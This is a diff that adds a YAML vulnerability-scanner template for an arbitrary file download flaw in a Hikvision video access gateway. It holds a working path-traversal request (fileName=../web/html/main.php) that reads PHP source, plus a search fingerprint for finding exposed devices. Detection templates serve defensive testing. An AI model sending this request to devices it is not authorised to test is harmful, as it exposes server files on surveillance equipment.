@@ -1,0 +1,13 @@
+name: hikvision-showfile-file-read
+rules:
+ - method: GET
+   path: /serverLog/showFile.php?fileName=../web/html/main.php
+   expression: |
+      response.status == 200 && response.body.bcontains(b'$_SERVER[\'HTTP_HOST\'];') && response.body.bcontains(b'$_POST[\'userName\'];')
+info:
+  author: zan8in
+  description: |
+    海康威视视频接入网关系统在页面/serverLog/showFile.php的参数fileName存在任意文件下载漏洞
+    title="视频编码设备接入网关"
+  links:
+    - http://wiki.peiqi.tech/wiki/iot/HIKVISION/HIKVISION%20%E8%A7%86%E9%A2%91%E7%BC%96%E7%A0%81%E8%AE%BE%E5%A4%87%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3%20showFile.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E.html
